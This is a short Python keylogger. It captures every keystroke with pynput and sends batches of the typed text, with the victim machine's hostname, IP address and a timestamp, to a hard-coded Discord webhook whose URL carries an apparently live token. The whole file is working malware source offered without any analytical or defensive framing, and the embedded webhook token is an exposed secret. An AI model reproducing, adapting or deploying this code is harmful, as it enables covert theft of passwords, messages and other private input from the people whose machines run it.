from discordwebhook import Discord
from pynput.keyboard import Key, Listener
import datetime
import socket

# Se connecte à discord
discord = Discord(url="https://discordapp.com/api/webhooks/1089933792183058464/fClMHd0bcMpygzDLELz6BAXLj59fBnSuF3guPinkUdANBcTlCFOiJlrDQAadvPZoVHez")

send = []
HOSTNAME = socket.gethostname()
IP = socket.gethostbyname(HOSTNAME)
TIME = datetime.datetime.now()

msg_debut = f"### CONNECTION ###\nHOSTNAME : {HOSTNAME}\nIP Adress : {IP}\nTIME : {TIME}\n"
discord.post(content=msg_debut)

def verify_queue(key, tab):
    if len(tab) == 30:
        final = [""]
        for i in tab:
            if i.startswith("Key.") | i.startswith("\\x"):
                if i == "Key.space":
                    final[-1] += " "
                else:
                    final.append(i)
            else:
                final[-1] += i.split("\'")[1]
        msg = "\n".join(final)
        discord.post(content=msg)
        tab.clear()
    tab.append(key)

def on_press(key):
    verify_queue(str(key), send)

def release(key):   
    if key == Key.esc:
        discord.post(content="### END OF CONNECTION ###")
        return False

with Listener(on_press = on_press, on_release = release) as listener: 
    listener.join()
    input()